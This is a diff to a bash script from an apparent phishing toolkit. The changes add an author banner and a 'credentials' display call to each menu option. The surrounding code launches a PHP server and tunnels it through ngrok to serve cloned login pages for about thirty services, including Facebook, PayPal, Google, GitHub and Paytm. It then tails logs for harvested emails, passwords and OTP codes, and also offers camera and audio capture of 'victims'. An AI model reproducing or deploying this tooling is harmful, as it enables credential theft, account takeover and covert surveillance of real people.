@@ -310,17 +310,41 @@ function main() {
         launch="starting shark server";splashdown="started shark server";printf "\n";connection;php -S 127.0.0.1:4444 > /dev/null 2>&1 & sleep 0.1;ngrok http 4444 > /dev/null 2>&1 & sleep 20 & spinner;link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io");url_shortner;
 }
 
-#Paytm
+#banner2
+banner2() {
+	printf "\n${green}
+        ╔════════════════════════════════════╗
+        ║${white}   ╔═╗┬─┐┌─┐┌┬┐┌─┐┌┐┌┌┬┐┬┌─┐┬  ┌─┐${green}  ║
+        ║${white}   ║  ├┬┘├┤  ││├┤ │││ │ │├─┤│  └─┐${green}  ║
+        ║${white}   ╚═╝┴└─└─┘─┴┘└─┘┘└┘ ┴ ┴┴ ┴┴─┘└─┘${green}  ║
+        ╚════════════════════════════════════╝
+     
+        Author    : ${white}Ashish Singh${green}                 
+        Github    : ${white}github.com/Bhaviktutorials${green}   
+        Publisher : ${white}Bhavik OZa${green}                   
+     
+        >> ${white}${final_url}${green} \n\n"
+}
 
+#credentials
+function credentials() {
+	clear
+	banner2
+
+}
+
+#Paytm
 function paytm() {
           printf "\n${red}[${white} 1 ${red}]${green} Sign In \n\n" 
           printf "${red}[${white} 2 ${red}]${green} Sign Up \n\n"                           
           read -p $'\e[1;31m>>>\e[1;92m Enter Your Choice : \e[0m' option1			  
           if [ $option1 = 1 ] || [ $option1 = 01 ]; then	           
 		   cd paytm/ && main
+		   credentials
                    tail -f log.txt | grep -e "email" -e "username" -e "password" -e "otp"			              	
 	  else	           
                    cd signup/ && main
+		   credentials
 		   tail -f log.txt | grep -e "email" -e "loginPassword" -e "mobileNumber" -e "otp"
 	  fi
 }
@@ -357,6 +381,7 @@ function camera_hack() {
 		link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
                 sed 's+forwarding_link+'$link'+g' ${source} > index2.html;sed 's+forwarding_link+'$link'+g' template.php > index.php
 		main
+		credentials
 		while [ true ]; do			
                         if [[ -e "ip.txt" ]]; then				
 			        printf "\n${green}[${white}+${green}] Victim opened the link!\n"
@@ -379,6 +404,7 @@ function audio_hack() {
         redirect_link="${redirect_link:-${default_redirect}}";link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
         sed 's+forwarding_link+'$link'+g' template.php > index.php;sed 's+redirect_link+'$redirect_link'+g' js/_app.js > js/app.js
 	main
+	credentials
         while [ true ]; do		
                 if [[ -e "ip.txt" ]]; then			
 		 	printf "\n${green}[${white}+${green}] Victim opened the link!\n\n"
@@ -393,7 +419,6 @@ function audio_hack() {
 	done
 
 }
-
 
 while :
 do
@@ -439,31 +464,37 @@ banner(){
 
         if [ $option = 01 ] || [ $option = 1 ];then		
 	        cd ${phish}/facebook/ && main
+		credentials
 	        tail -f usernames.txt 
                 break;
 
 	elif [ $option = 02 ] || [ $option = 2 ];then		
-                cd $phish/pinterest/ && main                           
+                cd $phish/pinterest/ && main    
+		credentials
                 tail -f log.txt | grep -e "id" -e "password"
                 break;
 
 	elif [ $option = 03 ] || [ $option = 3 ];then		
 		cd $phish/instagram/ && main
+		credentials
 	        tail -f log.txt
                 break;
 			   
 	elif [ $option = 04 ] || [ $option = 4 ];then		
-                cd $phish/UberEats-Phishing/ && main			  
+                cd $phish/UberEats-Phishing/ && main	
+		credentials
 	        tail -f log.txt | grep -e "Email_or_Phone" -e "password" -e "verificationCode"
                 break;
 			  
         elif [ $option = 05 ] || [ $option = 5 ];then		
                 cd $phish/ola-otpbypass/ && main
+		credentials
 		tail -f log.txt | grep -e "number" -e "otp" -e "OTP"
                 break;
 			  
         elif [ $option = 06 ] || [ $option = 6 ];then		
-                cd $phish/google-otp/ && main                         
+                cd $phish/google-otp/ && main 
+		credentials
 		tail -f log.txt | grep -e "email" -e "password" -e "OTP"
                 break;		
 			  
@@ -472,122 +503,145 @@ banner(){
 		break;
 			
         elif [ $option = 08 ] || [ $option = 8 ];then		
-                cd $phish/Netflix/ && main                          
+                cd $phish/Netflix/ && main        
+		credentials
                 tail -f log.txt | grep -e "userLoginId" -e "password" -e "OTP"                 
                 break;
 
         elif [ $option = 09 ] || [ $option = 9 ];then		
-                cd $phish/instafollow/ && main                           
+                cd $phish/instafollow/ && main    
+		credentials
                 tail -f log.txt | grep -e "username" -e "password" -e "password" -e "pin" -e "Pin"                        
                 break;
 			   
         elif [ $option = 10 ];then		
-                cd $phish/amazonsign/ && main                            
+                cd $phish/amazonsign/ && main   
+		credentials
                 tail -f log.txt | grep -e "email" -e "password" -e "OTP"  
                 break;
 
         elif [ $option = 11 ];then		
-                cd $phish/whatsapp-phishing/ && main                          
+                cd $phish/whatsapp-phishing/ && main
+		credentials
                 tail -f log.txt | grep -e "number" -e "OTP" -e "otp"      
                 break;		
 			   
 	elif [ $option = 12 ];then		
-                cd $phish/Linkedin/ && main                           
+                cd $phish/Linkedin/ && main    
+		credentials
                 tail -f log.txt | grep -e "email" -e "Email" -e "password" -e "pin" -e "Pin"
                 break;
 
         elif [ $option = 13 ];then		
-                cd $phish/Hotstar-otp-bypass/ && main          
+                cd $phish/Hotstar-otp-bypass/ && main    
+		credentials
                 tail -f log.txt | grep -e "phoneNo" -e "OTP"
                 break;		
       
         elif [ $option = 14 ];then		
-                cd $phish/spotify/ && main                          
+                cd $phish/spotify/ && main    
+		credentials
                 tail -f log.txt | grep -e "username" -e "password" -e "password" -e "pin" -e "Pin"
                 break;
 			  	
         elif [ $option = 15 ];then		
-                cd $phish/github/ && main                           
+                cd $phish/github/ && main 
+		credentials
                 tail -f log.txt | grep -e "login" -e "password" -e "otp"
                 break;
 			   
 	elif [ $option = 16 ];then		
                 cd $phish/ipfinder/ && main
+		credentials
                 tail -f ip.txt        
                 break;
 
         elif [ $option = 17 ];then		
-                cd $phish/Zomato-Phishing/ && main                           
+                cd $phish/Zomato-Phishing/ && main    
+		credentials
                 tail -f log.txt | grep -e "email" -e "otp" -e "OTP"                
                 break;
 
         elif [ $option = 18 ];then		
-                cd $phish/phonepay/ && main                        
+                cd $phish/phonepay/ && main   
+		credentials
                 tail -f log.txt | grep -e "number" -e "otp"
                 break;
 			   
 	elif [ $option = 19 ];then		
-                cd $phish/paypal/ && main                           
+                cd $phish/paypal/ && main    
+		credentials
                 tail -f log.txt | grep -e "login_email" -e "login_password" -e "otpCode"
                 break;
 
 	elif [ $option = 20 ];then		
-                cd $phish/telegram/ && main                        
+                cd $phish/telegram/ && main
+		credentials
                 tail -f log.txt | grep -e "phone_number" -e "phone_code"
                 break;
 			   
 	elif [ $option = 21 ];then		
-                cd $phish/twitter/ && main                           
+                cd $phish/twitter/ && main
+		credentials
                 tail -f log.txt | grep -e "phone_or_email" -e "password" -e "challenge_response"
                 break;
 		               
 	elif [ $option = 22 ];then		
-                cd $phish/flipcart/ && main                          
+                cd $phish/flipcart/ && main  
+		credentials
                 tail -f log.txt | grep -e "email" -e "password" -e "otp"
                 break;
        
         elif [ $option = 23 ];then		
-                cd $phish/wordpress/ && main                          
+                cd $phish/wordpress/ && main  
+		credentials
                 tail -f log.txt | grep -e "log" -e "pwd"
                 break;		
 			  
 	elif [ $option = 24 ];then		
-                cd $phish/snapchat/ && main                           
+                cd $phish/snapchat/ && main
+		credentials
                 tail -f log.txt | grep -e "username" -e "password" -e "Code"
                 break;
 		
 	elif [ $option = 25 ];then		
-                cd $phish/protonmail/ && main                           
+                cd $phish/protonmail/ && main    
+		credentials
                 tail -f log.txt | grep -e "username" -e "password"   
                 break;
 
         elif [ $option = 26 ];then		
-                cd $phish/stackoverflow/ && main                           
+                cd $phish/stackoverflow/ && main  
+		credentials
                 tail -f log.txt | grep -e "email" -e "password"
                 break;
 
         elif [ $option = 27 ];then		
-                cd $phish/ebay/ && main                          
+                cd $phish/ebay/ && main    
+		credentials
                 tail -f log.txt | grep -e "userid" -e "pass" -e "pin"
                 break;
 
         elif [ $option = 28 ];then		
-                cd $phish/twitch/ && main                           
+                cd $phish/twitch/ && main
+		credentials
                 tail -f log.txt | grep -e "Username" -e "password" -e "otp"
                 break;
                 
 	elif [ $option = 29 ];then		
-                cd $phish/ajio/ && main                           
+                cd $phish/ajio/ && main  
+		credentials
                 tail -f log.txt | grep -e "username" -e "password"
                 break;
 			   
 	elif [ $option = 30 ];then		
-                cd $phish/mobikwik/ && main                         
+                cd $phish/mobikwik/ && main 
+		credentials
                 tail -f log.txt | grep -e "userId" -e "otp"
                 break;
 			  
 	elif [ $option = 31 ];then				  
-		cd $phish/Camera_hack && file_check
+		cd $phish/Camera_hack && file_check		
 		camera_hack
 	        break;
 			   
